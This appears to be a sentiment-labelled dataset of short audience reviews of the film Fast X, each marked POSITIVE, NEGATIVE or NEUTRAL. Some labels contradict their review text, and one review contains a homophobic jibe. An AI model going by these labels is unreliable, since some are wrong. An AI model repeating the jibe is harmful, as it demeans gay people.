"May 20, 2023",POSITIVE,"There were no dull moments, nothing but action in this movie.  From beginning to end, you kept your eyes on the screen.  Loved it  !!!!!!"
"May 20, 2023",POSITIVE,it was a great movie action packed and a must-see if you want a adrenaline Rush this is the movie to see
"May 20, 2023",NEGATIVE,"Take Nicholson's and Ledgers joker characters and merge them together with a bit of the Joker voiced by Hamel and the fashion of Prince. You would have Jason Momoa's perfect comic book villain, in a movie about racing cars. Yes people Fast X is here. Let me explain.

Let's say a stick of acme dynamite is strapped to the bottom of a baby stroller 1000 ft away and Dom is in a car on two wheels doing a wheelie. He jumps out grabbing the stroller in one arm saving the baby the other hand is used to throw the stroller at two helicopters have those crash and him ski down Mount Everest on a car door still holding the baby and you'd get a more believable scene that what was put in this movie. 

A 10 year old kid kills people in this movie and it's glossed over with jokes. At some point I believe Car fu will become a thing,  like two helicopters are used as nunchucks. A car is on fire a tank of Nitrous Oxide is opened and no explosion happens. These movies are overbearing and running out of road. Momoa atleast brings something different. Vin Diesel is dry and the not many others have any personality. It's going to make a lot of money they're going to make a lot more. While mindless action movies were short and fun. These take themselves seriously and are drawn out. Please do better but i know you won't 1/5."
"May 20, 2023",NEUTRAL,The movie to me was all over the place... I did not like Jason's character.. he was giving Joker vibes [ like he's wants to be in a Batman movie or something) it left me and my friends with unanswered questions like wth with all the characters... I've been a fan since the very first movie... The Action was ok but not like wow it was their norm....
"May 20, 2023",POSITIVE,"The movie was very entertaining, although some of the stunts were a bit overboard. It still keeps you on the edge of your seat. Momoa's character reminded me of the Joker in Batman. Dark and funny."
"May 20, 2023",POSITIVE,"The humor in it was hilarious!
It was great to see the gang back together and even a flashback clip of Paul Walker."
"May 20, 2023",POSITIVE,Awesome action packed movie
"May 20, 2023",POSITIVE,Lots of action and the continued storyline
"May 20, 2023",NEUTRAL,"Enjoyed the action, but it was half a movie"
"May 20, 2023",POSITIVE,"I loved all exposures, Dontea & Shotse not so much"
"May 20, 2023",POSITIVE,"Nonstop action, drama, cool cars, racing and not to mention Jason Momoa's character stole the show. People need to remove the rose tinted lenses and realise that fast and furious has never been about street racing, nor were the old movies realistic. If you want to be kept entertained, and have your mind blown by the physics defying scenes that occur in this movie then I would 100% recommend!"
"May 20, 2023",POSITIVE,In true Fast and Furious fashion. Ready for the next one.
"May 20, 2023",NEGATIVE,"Pure ""Pewther"" 2 and a half hours I'll never get back. No word of family when he was booking your wan."
"May 20, 2023",POSITIVE,Best of the Fast and Furious series. I went with 2 others and they all agreed. It was an awesome movie. Nonstop action!!!  Will go see it again.
"May 20, 2023",NEUTRAL,"I just watched it featuring Brie Larson. I'll admit that she was great in her role as Tess. But as always, she is my favorite actress known as Captain Marvel!"
"May 20, 2023",POSITIVE,Honestly film was really good but why did they have to end it in a cliff hanger?
"May 20, 2023",POSITIVE,Excellent thrill seeking movie! Lots of surprises to see
"May 20, 2023",NEGATIVE,"Same old story, same script, Nothing to talk about after the movie, and unutilized actors"
"May 20, 2023",POSITIVE,"It was amazing, definetly way to many cliff hangers."
"May 20, 2023",POSITIVE,The movie was really good. I really enjoyed it.
"May 20, 2023",POSITIVE,High Octane Action Great Summer movie
"May 20, 2023",POSITIVE,"Movie was great, didn't like how there was a cliffhanger at the end. Lol."
"May 20, 2023",POSITIVE,"If you like the series and all the movies thus far, youll love this one too. Although unrealistic car actions scenes, its a good movie (and those scenes are to be expected). Cant wait for the next one. I have questions."
"May 20, 2023",NEUTRAL,I now believe in Unicorns!
"May 20, 2023",POSITIVE,Im a fan of the franchise and as sad as it is Paul walker died. The movies still never seem to disappoint. Money well spent. I was engaged the entire time.
"May 20, 2023",NEUTRAL,it's time to end this nonsense
"May 20, 2023",NEUTRAL,Its a fun movie but definitely not the best. Between the cheesy lines and very unbelievable stunts I was getting annoyed. Momoa's channeling his inner Joker character could've been toned down some also.
"May 20, 2023",POSITIVE,Action-packed.  Left me on the edge of my seat.
"May 20, 2023",POSITIVE,I thought this was the last one
"May 20, 2023",POSITIVE,"Waiting for Dom to say, Im Batman and Dante to say why so FuriousAnother over the top spectacle that fills Fast Fan tanks. Awesome!!!"
"May 20, 2023",POSITIVE,So much action - great movie!
"May 20, 2023",POSITIVE,Action packed from the beginning to the end. Treated my hubby for his birthday and he absolutely loved it!!
"May 20, 2023",POSITIVE,Lots of action ! Eye catching in XD
"May 20, 2023",POSITIVE,"Absolutely amazing I loved every minute of it, the action scenes were incredible, Jason Momoa is excellent as the bad guy, definitely worth seeing in theaters, I can't wait for Fast and Furious 11"
"May 20, 2023",POSITIVE,Great movie & stunts
"May 20, 2023",POSITIVE,Jason Mamosa played his part to the tee..  loved all the action and the character were awesome!!   Can’t wait till the next one.
"May 20, 2023",POSITIVE,"I have long been a Fast & Furious franchise supporter. 4 of the films were a bit meh, however, overall I'm in. But Fast X though...Jason Momoa put this film on his back and carried it across the finish line. He played THE best villain I've seen in a while. This was one of his best performances to date.  Momoa was in his lane playing a full-blown psycho and stole every scene he was in. Though Momoa isn't always seen as an actor with great range, but he's done a few variations on the macho bada**, and the fact that they all felt different with distinct personalities is impressive. I'm definitely going to watch Fast X again.

Fast X is much better than F8 & F9 and is equal to F7, which I thought was the best of the franchise until now. Fast X is WAY over the top, so fasten your seatbelts, you're in for a helluva ride. Did Fast X make a lot of sense in technical cinephile terms, nope. But who cares, sometimes you just want a fun afternoon at the movies with heroes, villains, awesome stunts, explosions, car chases and craziness. 

Numerous critics are dragging this film like they expected it to be some tour de force in filmmaking...where have they been all of these years? The Fast and Furious franchise isn't meant to be The Godfather, it's meant to entertain....try to pay attention critics.🤣

The acting was good, though Vin Diesel and his mumbling irritates me, but it is what it is.🤣If you just want a mindless, albeit enjoyable thrill ride in a film, plus get your money's worth considering these high ticket prices, Fast X is the film for you."
"May 20, 2023",POSITIVE,Loved the movie! Lots of action.
"May 20, 2023",POSITIVE,Love the action scenes. The ending well... I won't say much as to not spoil for others
"May 20, 2023",POSITIVE,Fast X the movie is badass movie ever and so cool and is awesome with returning people from death badass movie ever love it awesome movie ever can’t wait for the next movie with fast and furious franchise
"May 20, 2023",POSITIVE,It was a really cool movie.  I love all the fast and furious movies.
"May 20, 2023",NEGATIVE,Stupidest movie ever!  They really drive the FAMILY narrative in this one.
"May 20, 2023",POSITIVE,actually was good lol
"May 20, 2023",NEGATIVE,I didnt like the ending it was awful but funny
"May 20, 2023",NEUTRAL,"Its a movie you see once. But its over the top, as all recent ones are. A lot of action. Our guys never have a scratch on them. They mention Bryan once. Idk why. So yeah 3.5/5"
"May 20, 2023",POSITIVE,"Its always fun to watch a Fast Saga movie with an audience, having numerous people around you reacting and taking in the sheer absurdity of what’s happening on screen is a huge part of the mass appeal of this franchise. These movies left realism a long time ago and they’re all the better for it. The Fast Family is pretty well formed at this point with everyone playing their characters effectively, but the movie splits the fam up into four groups each paired with a reformed villain from the past and it doesn’t always work too well, fragmenting the plot into too many elements to keep track of. Roman, Tej, Ramsey, Han and Shaw’s group is reserved for laughs while Letty and Cipher have their own rivalry subplot going on in a secret Agency black site. Jakob and Little B have the fun uncle-nephew dynamic going on which leads to some wholesome moments while Dom is benched off to Rio to deal with the main antagonist Dante played by Jason Momoa who is by far the best part of this movie. Having the son of the antagonist from Fast Five come back after all these years to take revenge is an insane plot completely in line with what the Fast universe has become and Momoa embodies the absurd nature of these movies perfectly as Dante. Channeling his inner Joker, wearing pigtails, painting the toe nails of dead bodies as he dances among them, Dante has a fleshed out personality and is by far the most memorable and dangerous villain Dom and his crew have faced so far. Also he wins by the end with this being a part one of a possible three-part story so I guess we’ll have to wait for a resolution until 2025. Oh yeah, Hobbs is back and so is Gisele (somehow, nothing makes sense anymore idk). Fast X Score: 8/10"
"May 20, 2023",NEGATIVE,have to add to the collection but thats it....Vin Diesel is soooo obsessed with himself...hes like a new age Stallone...writing/Directing/Acting lol
"May 20, 2023",POSITIVE,While the movie was great I didn't like the way it ends which leaves a lot of unanswered questions.
"May 20, 2023",POSITIVE,The movie was great. Great action pack
"May 20, 2023",POSITIVE,I enjoyed the movie but hat Brie Larson she can't act is unattractive and I really wanted her character to die other than that good movie
"May 20, 2023",POSITIVE,"A lot of action, love seeing the flashbacks of the other movies in this movie. I liked it!"
"May 20, 2023",POSITIVE,Jason Mamoa was genuinely enjoying himself. And for the first time in FAST history.. they properly subverted our expectations. This was an amazing adrenaline fueled ride that did not stop once it started.
"May 20, 2023",NEGATIVE,"I hated this movie from start to finish. GOD AWFUL!! Stupid illogical & impossible action scenes. At this point only freaking Superman & the Justice League can stop Dominic Torretto & his family. Honestly the last 4-5 movies in this franchise has been stupidly over the top like going into space, tanks on the highway & stealing Russian nuclear submarines. Who the hell approves these scripts?? But these movies keep making crazy movie so were going to keep getting them."
"May 20, 2023",POSITIVE,Great movie but ending left to many unanswered questions.  Set it up for a Fast11.
"May 20, 2023",NEGATIVE,So dumb…please just stop
"May 20, 2023",NEGATIVE,Worst movie of all time. Dont waste your money. Wish I could get my money back.
"May 20, 2023",POSITIVE,"Daunte (Jason Mamoa) made this movie likeable he funny, he's literally the only reason this movie got the rating I gave it. Still has the the action when laws of physics don't matter and the ""family"" thing going on but it does have a lot of action which most of it is good overall it's a good movie does leave you on a cliff hanger and won't spoil anything of the movie"
"May 20, 2023",POSITIVE,It was was funny and just a great movie
"May 20, 2023",POSITIVE,Hi octane like expected.   Jason Mamoa was a good spin.  Family over everything!
"May 20, 2023",POSITIVE,It never disappoints and ends with a sequel is even better
"May 20, 2023",POSITIVE,"ridiculous movie. bad acting. bad fx 
and I can't wait to watch it 10 more times!!!!"
"May 20, 2023",NEUTRAL,Would love to rate accurately but unfortunately I wasn’t able to make it but Fandango kept my money even after I tried to exchange for different time
"May 20, 2023",POSITIVE,"Lots of action & scenery, nice cars but most of all JASON MOMOA"
"May 20, 2023",POSITIVE,Unreal and Unlimited 👍🏻👍🏻
"May 20, 2023",NEUTRAL,"Slight improvement over its predecessors with great action, a great cliffhanger ending and a amazing performance by Jason momoa, Fast X prepares us for the franchise to have its last ride."
"May 20, 2023",NEGATIVE,As always not to spoil it.. but they always give toretto fam a chance to live instead of just pulling trigger wouldnt recom
"May 20, 2023",NEGATIVE,"fast and furious movies are supposed to be about cars and street races, wtf am i watching rn? some gay dude trying to kill the family with some fruity tricks like wtf ? did they reply think this was the right way of finishing the series?"
"May 20, 2023",POSITIVE,an awesome movie!! Kept my attention the whole way through!! Can't wait to see part 2!!
"May 20, 2023",POSITIVE,Hella fun and great twist at the end!
"May 20, 2023",POSITIVE,The movie was great. The action was awesome and the cast was brilliant. I enjoyed the cast in the movie they were all amazing. It’s worth seeing with your family. 👍❤️😀
"May 20, 2023",POSITIVE,"Love the funny, action and edge of your seat cliff hanger"
"May 20, 2023",POSITIVE,Off the fxxxxxx chain!!!!!!
"May 20, 2023",POSITIVE,Over the top action and for the first time very aware of some of insane stunts they do. Momoa shines as a villain and you can tell he loved his role. 100% better than 9. Looking forward to the conclusion of my ol time guilty pleasure franchises
"May 20, 2023",POSITIVE,I loved this movie! There was action from start to finish! They keep getting better and better! T hope they continue making these movies because they never disappoint! Loved it!!!!
"May 20, 2023",NEUTRAL,Hate the endibg leaves you hanging
"May 20, 2023",NEUTRAL,"As for an action movie this one doesn't disappoint, always edge of your seat entertainment, but seriously too over the top and just too darn fake for me, at least I didn't fall asleep.  The movie had too many smaller deviations in terms of other characters stories it became a mess, it was confusing with all these side stories and by cutting to their stories, it was distracting and irritating, didn't know what to focus on anymore.  

The following parts in the next paragraph I don't like will contain spoilers in the film, if you don't want to know, don't read on...

Firstly, the scene in the truck where the bomb is with Ludacris, he comes out and describes exactly what kind of bomb this is....come on!!!  How the hell does this guy know exactly what kind of bomb this is and how fricken far the damn blast radius of the bomb is just by looking at this fricken giant rolling ball lol, that turned me off, knowing the fact from where he came from since Fast2, some street hustling race gambling money collector and he's a bomb expert now?  Too much.

Second, Charlize Therons character in the secret prison, it was just ridiculous, she said she rewired the tranquilizer or anesthetic to go into the air condition vents hilarious, how does the anesthetic used on them in any way tie into the air conditioning system LOL!!!!

Also, why would Michelle Rodriguez end up in some high tech prison facility like that with a laser robot to seal her wound up?  Why would she get that kind of treatment, totally blows my mind even why she ended up there."
"May 20, 2023",POSITIVE,Great movie. One hell of a cliffhanger.
"May 20, 2023",POSITIVE,Not the best but good enough to keep you in
"May 20, 2023",POSITIVE,Great story and tie in to past characters!
"May 20, 2023",POSITIVE,made me feel like I did 20+ years ago :)
"May 20, 2023",NEUTRAL,"Mamoa STOLE the movie! This was the typical high pace intense over the top FF movie, with all the twist we come to expect, but Mamoas bad guy was NEVER done before. QWERTY and satisfying to watch. The trailers give his personality no justice. He appears to be an average baddie but when you see him in action you can't but help but laugh at how he took a different approach. Every scene with him the theater cracking up. I'm glad we are getting another sequel with him because scenes like the nail painting the corpses and his flamboyant mannerisms are what made the movie pop"
"May 20, 2023",POSITIVE,The Infinity War of the Fast and Furious franchise
"May 20, 2023",POSITIVE,"Momoa stole the show in this movie, great portrayal of that quirky character.  
Too many unanswered questions at the end.  Still a fan, mostly because of all the great actors in one film."
"May 20, 2023",POSITIVE,"Funny, exciting, dramatic, family oriented,"
"May 20, 2023",POSITIVE,"loved the movie, great acting by mamoa. good way to start drawing the saga to a close"
"May 20, 2023",NEUTRAL,Great action and jack sparrow is the bad guy.
"May 20, 2023",POSITIVE,"Great film! I was hooked from the opening scene and didn't notice the movie's length until it ended! Speaking of, THAT ENDING THOUGH!"
"May 20, 2023",NEGATIVE,Not enough racing and way too fictional anymore.
"May 20, 2023",NEGATIVE,Worst movie I have ever seen.  Please do not waste your money
"May 20, 2023",POSITIVE,"Jason Mamoa was everything!! He gave Heath Ledger Joker vibes, a little Joaquin Pheonix Joker vibes, he was excellent! I love the whole Fast and Furious franchise including Fast X!"
"May 20, 2023",POSITIVE,Not quite as predictable as you would expect. Jason Momoa really adds character to this franchise.
"May 20, 2023",POSITIVE,"I liked how the movie gave us a flashback to Fast Five and showed off new cars like the Gold
Lamborghini and Rocket Launcher Truck and that Hobbs was shown in the secret ending, what I didn't like was the cliffhanger at the end"
"May 20, 2023",POSITIVE,Awesome story telling. Lots of action. Ending is a jaw dropper.
"May 20, 2023",POSITIVE,great action pack movie. loved it!!!
"May 20, 2023",NEUTRAL,"Pretty much the same as any previous Fast movie, with natural progression of the way over the top story, action, etc. Good, dumb, action, fun. The true saving grace it Mamoa's performance as a bad guy. Honestly, if he was not in the movie, I would not even recommend this to anyone, but the biggest Fast fanboys. He really should play more bad characters. His naturally menacing appearance works so well, and then you add the fact that he has such charisma, he easily out-classes everyone else in the entire series, let alone this movie."
"May 20, 2023",NEGATIVE,If you turn off your brain this movie is fun but if you do not it will be terrible. Plus jason was great in every scene
"May 20, 2023",POSITIVE,Interesting plot with tons of fast action.  Did not know Jason Momoa could play such an evil character.
"May 20, 2023",NEUTRAL,Too many fight scenes and gross unnecessary scenes (momoa and dead bodies). Also a cheap shot to lure you in for the end only to have to wait 2 years for the next installment of the end.
"May 20, 2023",POSITIVE,Come on does it really need a review!
"May 20, 2023",NEGATIVE,Horrible movie . There is not point.
"May 20, 2023",POSITIVE,Your typical Fast movie with all the fixins!!  Action-packed with an even more star studded cast.  LIKED.  IT.  ALL!!
"May 20, 2023",POSITIVE,"It's got cars, explosions, fights and ""family."" Sometimes it has cars with family, family and explosions and explosions with fights."
"May 20, 2023",NEUTRAL,"The Movie was great as in the original actors, but I could not stand the Jason Mamoa as an Actor, he was the worse, I never seen Aquaman and now I'm glad. He made a great Movie bad. I"
"May 20, 2023",POSITIVE,Fun movie to let go of reality for a couple of hours!
"May 20, 2023",POSITIVE,Fun watch. Not to be taken seriously.
"May 20, 2023",POSITIVE,Greatest movie for this franchise. Best villain and it is about time there was some competition.
"May 20, 2023",POSITIVE,Love the action and cliffhanger
"May 20, 2023",NEGATIVE,"In a modern Fast and Furious film Called Fast X  Dominic Toretto is something immortal to a superhero. Able to survive countless near-death scenarios with bad cheap computer-generated imagery(special visual effects created using computer software) and terrible exclamations. Even famous and well-known actors can't revive this movie because this movie has become so sci-fi that even Paul Walker is turning in his grave. Watching this movie you will waste 4 hours of your life (advertising and the worst movie of your life).And the end is the beginning of the next part, because the movie is so bad and the actors are asking for money, they decided to make the next part fast 11 coming next 1-2years.the whole movie was made by someone who has the mind of a 2-year-old and the fantasies of a 5-year-old but a wallet like D-Trump.I really sympathize with those who have suffered this terrible failure"
"May 20, 2023",POSITIVE,Great movie tons of action
"May 20, 2023",POSITIVE,Loved every minute of the movie and stay through the first scene of credits for a surprise!
"May 20, 2023",NEUTRAL,"La película de fast x esta buena es pasable solo que en ocasiones se pasan de ficción pero eso es lo nos han dado prácticamente desde la 5,y eso es súper, si tú eres más fan de la 1 o 2 está no te va gustar pero si amaste la 5 para adelante te va ha impresionar , algo que destaca es su elenco la magnífica actuación de momoa como villano no es como las anteriores este villano es astuto y hará que la familia comience a tener temor"
"May 20, 2023",POSITIVE,Can’t wait for the next one ❤️😄
"May 20, 2023",POSITIVE,"For action, five stars. For believability, four stars. Having to wait until next year for the conclusion, zero stars lol. All in all, a must see if your a Fast Saga fan."
"May 20, 2023",POSITIVE,AMAZING!!! FULL OF ACTION!!! I WOULD DEFINITELY GO SEE THIS AGAIN!!
"May 20, 2023",POSITIVE,"Absolutely amazing movie 
Can't wait to see what's next!"
"May 20, 2023",POSITIVE,Full of action and a great cliff hanger!
"May 20, 2023",POSITIVE,Jason Momoa is AMAZING as Dante & worth the price of admission alone!!
"May 20, 2023",POSITIVE,So many surprises! Great movie
"May 20, 2023",NEGATIVE,I would have given this movie less than 1 star if that were an option
"May 20, 2023",POSITIVE,Great movie!! LOTS of action!! Kept me on the edge of my seat!!
"May 20, 2023",POSITIVE,I liked the part when they have a race and they play the song “Good Vibrations”
"May 20, 2023",NEGATIVE,"Absolutely ridiculous movie. If you want to pay $15 to sit in a theater and laugh at this by all means do so, but you would be much better off waiting till it's free on a subscription service. How do they keep making movies about this?"
"May 20, 2023",NEUTRAL,"mamoa is the best part of this show. he's evil and he's having fun. with so many villains getting 'oh he's just misunderstood' backstories, its refreshing to see a simple, hate-able bad guy, and what better vehicle than a simple fast-cars and explosions movie.  that said, CGI could have been better, and too many people come back from the dead for me to believe some characters are really, for sure this time, we promise, dead."
"May 20, 2023",NEGATIVE,"Absolute dogshit. I was literally amazed how bad it is. It looks exactly like a movie made with a AI text bot would make it. The scenes of the movie didn't even blend in, music is tacky and changing so obviously like someone changed a tv channel, dialogue that is lough out loud moronic."
"May 20, 2023",POSITIVE,"For the action sequence and the appearance of nostalgia actors, I recommend a watch."
"May 20, 2023",POSITIVE,"The movie was as expected, action packed with twists and turns. I am bit disappointed that there is a cliff hanger but that will motivate me to watch the next movie to be released"
"May 20, 2023",POSITIVE,"One Spoiler. They do not go to space. That alone already makes this better than F9. Is this movie perfect? No. Will this movie be nominated for Oscars or Golden Globes? I highly doubt it. Is this movie turn your brain off, loud over-the-top action? You bet your ass it is. I had a lot of fun with this movie. You can tell Jason Momoa had a lot of fun with this character. My only complaint was I saw the Twist coming and I'm getting tired of villains from previous F&F movies teaming up with Toretto and his Family. I look forward to seeing this again."
"May 20, 2023",POSITIVE,They left us hanging it was fire can’t wait for the next one
"May 20, 2023",NEUTRAL,"Good enough for summer movie. Summer movie- nothing more, nothing less"
"May 20, 2023",NEGATIVE,I miss the movie can’t get my refund or exchange
"May 20, 2023",NEGATIVE,Quite possibly the worst movie I have watched in theaters in my life. This was the corniest most cringe action film I have ever witnessed and the plot of the movie is garbage like most recent Fast and Furious movies and of course they leave a cliffhanger to release an 11th movie of the same braindead plot. They should have ended this franchise on a good note. Now it just seems like theyre pushing out this horrible content as a money grab because they know braindead fast and furious fans will gladly pay money to watch the basically the same damn movie every few years. If you have any braincells this movie is not for you. If you like seeing the most unrealistic stunts and mindless explosions with no plot then this movies for you. Also Jason Momoa is the worst villian ive ever witnessed on screen and his character has the most generic villian backstory ever.
"May 20, 2023",NEGATIVE,"I didn’t go, I went to the wrong movie theater"
"May 20, 2023",POSITIVE,The movie is so good and lot of action!
"May 20, 2023",POSITIVE,"Awesome movie!!  I’m excited for the next one, but I’ll be sad it’s all over."
"May 20, 2023",NEGATIVE,The ending was a to be continued
"May 20, 2023",POSITIVE,It was an amazing experience watching Fast X. Never a dull moment in the whole movie. Definitively not as good as Fast and furious 5 or 7 but much better than F9 and somewhat better than F8 and F6. Just turn your brain off and enjoy this thrilling ride. A solid entry in F&F saga.
"May 20, 2023",NEUTRAL,Started off awesome but ended with some questions  part 2 maybe???? Fast xl???
"May 20, 2023",NEUTRAL,it's was okay better than the last one
"May 20, 2023",POSITIVE,"•The movie is great but I think its too rushed. •I do like the enjoyment of the movie i enjoyed watching start to end unlike some movies.
 •I don't like the way they timetraveled to the future of technology with self driving cars.

•I would recommend"
"May 20, 2023",POSITIVE,Love the movie and the storyline. The added characters were amazing. Jason Momoa's energy was unmatched.  I am a huge FAST FAN!
"May 20, 2023",POSITIVE,"Um filme, bem mais pé no chão que o filme anterior. Em que trás muito entretenimento e diversão do início ao fim. Vale muito a pena o seu ingresso."
"May 20, 2023",NEGATIVE,it can't get more ridiculous
"May 20, 2023",POSITIVE,"FAST X is not only the best Fast & Furious film yet, but quite possibly the best action film I've seen till now.."
"May 20, 2023",POSITIVE,They finally have a great villain that's kind of psychotic and unpredictable
"May 20, 2023",POSITIVE,Really good and unexpected
"May 20, 2023",POSITIVE,"5 stars for comedic relief
4 stars for Jason's psycho persona (Joker+Jack Sparrow)
3 stars for not enough street racing
2 stars for too much CGI
1 star for the never ending story."
"May 20, 2023",POSITIVE,"Love, family, comedy and lots of actions!! They dont ever fail! A lot of old faces as well as people coming back from the dead!!! CaNnot wait for the sequel!!! Love the franchise"
"May 20, 2023",NEGATIVE,"Para mí es una película vacía, sin nada que asombré, con fórmulas ya rebuscadas para hacernos sentir nostalgia, escenas de acción sin sentido y demasiado alejadas de lo posible, en fin, en película, es a Bad Bunny a la música"
"May 20, 2023",POSITIVE,Awesome.great action filled.must see
"May 20, 2023",POSITIVE,Lots of twists and surprises definitely edge of seat action
"May 20, 2023",POSITIVE,"A lot of great action, but too many Unanswered questions. Until next time!!"
"May 20, 2023",NEGATIVE,A lot of characters moved around places and this is a very long movie to then have a cliffhanger that doesn't feel tense because we never fear for Vin's life.
"May 20, 2023",POSITIVE,The movie was actuon6 from beginning to end an that's what you pay to see if being honest.... but an yes there's a BUT please leave your common sense in the car no pun intended but cars are flipping in mid air. driving down walls and backing outta planes  while there's not a scratch on our favorite characters so don't take it too serious just enjoy the ride...literally!
"May 20, 2023",POSITIVE,"it was acton packed, the new guy that was after them was very weird.  but over all I really liked the movie."
"May 20, 2023",POSITIVE,Fantastic Movie!!!! This movie Never Disappoints Never!!!  Can’t wait to see the next one!!! Kick Butt Dom and Leave a Legacy with your Son!!!
"May 20, 2023",POSITIVE,Awesome movie l loved it it was one of the best movies I’ve ever seen in my life
"May 20, 2023",POSITIVE,Good movie!! Loved the twist!!
"May 20, 2023",NEGATIVE,"Listen this movie is really stupid but it is entertaining. Worst part of this garbage was Vin Diesel, Tyrese, and Michelle Rodriguez and whoever wrote their dialogue should never work ever again. But Jason M was great and so was Cena. Jason Statham was good but was only in it for a bit"
"May 20, 2023",POSITIVE,"Lots of action, good story line and kept you interested as all fast and furious movies do. I loved it"
"May 20, 2023",POSITIVE,"Action packed, loved the surprise actors since I chose not to read any spoilers ahead of time. Will be seeing this again, loved it!"
"May 20, 2023",POSITIVE,"Love love this movie, cant wait for the next one to come out"
"May 20, 2023",POSITIVE,"Saw it last night, it was pretty good. Better than the last. Jason Mamoa kills it as the villain. "
"May 20, 2023",POSITIVE,"Action filled, loved it!!"
"May 20, 2023",POSITIVE,"The entire cast, the action scenes, and the homages to the past were top shelf. Jason Momoa brought his villainous A game."
"May 20, 2023",NEGATIVE,"The level of ABSURDITY in the movie is RIDICULOUS...even for THIS franchise. Not as bad as the previous 2, but the action makes the movie. Nothing else. 2.75. Go for the action, any semblance of the earlier versions will never come back. While Jason was flamboyant, he was just as entertaining."
"May 20, 2023",NEGATIVE,"Didn’t expect much, but it was entertaining, in a Fast and the Furious way."
"May 20, 2023",POSITIVE,Tenia pocas esperanzas de la película pero cuando la vi la verdad se vuelve una de las mejores de la saga ya que el final no te lo esperes el villano lo ase simplemente impresionante cada actor se luce  y se vuelve de las mejores películas de la saga
"May 20, 2023",NEUTRAL,Fast X is a crowd pleaser and that's all it's trying to do....that's not bad
"May 20, 2023",NEGATIVE,A epic fail !!! Lets throw every Hollywood actor together and try to make it make sense . Whyyyyyyyy Jason doesn't do silly well terrible ending!
"May 20, 2023",POSITIVE,It was a step up from the previous two films. Some questionable moments but Jason Mamoa and John Cena really shine in this one. Very fun movie to watch and a crazy ending.
"May 20, 2023",POSITIVE,"I thought, in my opinion, this movie is incredible. it has you on the edge of your seat the entire time, Jason Momoa has got to be one of the best villains in the franchise and probably of the year with him putting a massive smile on my face whenever he appears, the Soundtrack is fantastic, the action is shot incredibly well and looks brilliant and I loved all the plot twists they gave us. there is a post-credit scene that is very important. this is basically the infinity war of the Fast saga with it being the best and ending on a massive cliffhanger which we have to wait 2 years to see the next one. it definately deserves more love."
"May 20, 2023",POSITIVE,"Action packed thriller
Story continuing from earlier films.
Should have more continuing after this one.
They went above and beyond on this film!"
"May 20, 2023",NEUTRAL,Typical fast fare. Over the top physics defying action. Cartoony villain. Possible DC Universe hinted at. Black Adam vs. Wonder Woman. I look forward to the HISHE video on it.
"May 20, 2023",POSITIVE,"For a while, these movies have had stunts that everyone knows would never happen in real life. Other than that, pretty awesome movie."
"May 20, 2023",POSITIVE,"Love the action, its some exaggerated"
"May 20, 2023",NEUTRAL,Leave your brain at the door. I enjoyed the movie. Personally I think this franchise changed once Paul passed away. Enjoy the cars and the action.
"May 20, 2023",POSITIVE,Great movie!! Love the new and old characters. 
"May 20, 2023",POSITIVE,Loved it but I’m not sure I liked the ending.
"May 20, 2023",NEGATIVE,Action was good but I just couldn't believe what Jason Momoa agreed upon to play. This was turn off for me and last fast and furious movie I will ever watch.
"May 20, 2023",POSITIVE,"We paid for the whole seat, but only needed the edge!"
"May 20, 2023",NEUTRAL,"Totally different direction, they are running not achieving any storyline,  
Not all actors were given credits, & very open ended for the next film"
"May 20, 2023",NEGATIVE,"Exactly what I was expecting. Same review, as always, not a lot about racing more about saving the world."
"May 20, 2023",NEUTRAL,"Don't listen to people's,low ratings.This movie is solid but nothing special."
"May 20, 2023",POSITIVE,Unrealistic scenes but like always still very entertaining!
"May 20, 2023",POSITIVE,loved it!! ending was unexpected and the cliff hanger 😭😭😭
"May 20, 2023",NEUTRAL,Good movie although they sold this movie in the name of Pul Walker but still worth to watch because of Good action Sequence.
"May 20, 2023",POSITIVE,Loved it! Lots of new characters and bringing back old ones. Worth watching.
"May 20, 2023",NEGATIVE,horrible LOL worst movie ive seen in a while
"May 20, 2023",POSITIVE,Graphic was awesome  movie was good for 23 years they keep making great movies had every actor you can name in this movie was action pack  all the way through
"May 20, 2023",NEGATIVE,"The beginning was good. Plot moved at a good pace, nostalgic towards earlier entries in the series, but then the movie fell apart. They retconned the villain (like they did to Jason stathum in 7 from 3), plot was nonsensical, too many quick cuts in the fight scenes (to hide the cheap action), one race, not even a full one, the chase scene on the bridge defied physics, and the final scene was stupid. There is a cliffhanger because this is 1 of 2 (maybe 3) parts and then the mid credits scene did to DC comics super hero (no spoilers) as they did to Han…"
"May 20, 2023",NEGATIVE,Vin Diesel was terrible. Non sensical storyline. Not sure what they're thinking. Jason Mamoa was the highlight.
"May 20, 2023",NEGATIVE,Fast X is a campy popcorn flick chocked full of fan service and nostalgia; made for the diehard fans of the franchise (or someone who is just looking for some mindless fun).
"May 20, 2023",POSITIVE,I dont know I feel missing something
"May 20, 2023",NEUTRAL,"If you've accepted the ridiculousness of the FAST and Furious Franchise in the most recent years, then you'll enjoy this movie for sure. JASON MAMOA is the Standout in this film. It's cheesy, explosive and hilarious. You'll definitely enjoy this Popcorn Film. Just for the laughs, I'd recommend."
"May 20, 2023",POSITIVE,So amazing! The action was awesome. So many great characters. It felt like it hinted to a lot of past movies. Really hated that its a part 1 part 2 kind of movie though. Cant wait for the next one.
"May 20, 2023",POSITIVE,"Loved the movie, it was worth the wait because of its action pack, the preservation of family storyline, loved the clips of Paul Walker to maintain his memory, loved all the characters and their scripts, loved the complicated villain gone half good, and absolutely loved the smart-crazy Reyes as the anti-hero, and absolutely LOVE OUR BONUS ENDING WITH THE ROCK'S RETURN FOR NUMBER 11!!!!!!!!!!"
"May 20, 2023",NEUTRAL,'Fast X' is yet another mindless and absurd popcorn entertainer anchored by an over-the-top Jason Momoa performance.
"May 20, 2023",POSITIVE,"""Action from the begining until the end"" ""AWESOME"" with a capital ""A""  :)"
"May 20, 2023",NEGATIVE,Worst one of the Fast and Furious series
"May 20, 2023",POSITIVE,Loved the whole thing
"May 20, 2023",POSITIVE,It's not a typical racing movie there is enough humor and action in it to keep it interesting and wondering what will happen next.
"May 20, 2023",POSITIVE,JASON MAMOA MADE THE MOVUE HE WAS GREAT
"May 20, 2023",NEGATIVE,"Bring back Paul Walker, we have AI now."
"May 20, 2023",POSITIVE,"Repeat Viewing, love the Fast franchise"
"May 20, 2023",NEGATIVE,The worst of the whole series. The dialogue was really bad and the acting was even worse.
"May 20, 2023",POSITIVE,Nothing. Everything was awesome.
"May 20, 2023",POSITIVE,"Loved it, but it can't be the last surely! All story lines were left open!"
"May 20, 2023",POSITIVE,all the action was great good actors but on downside it was so out there and so impossible to far out from the beginning car races and action more realalistic
"May 20, 2023",POSITIVE,Know what you’re getting when you buy a ticket to these movies ridiculous but amazing
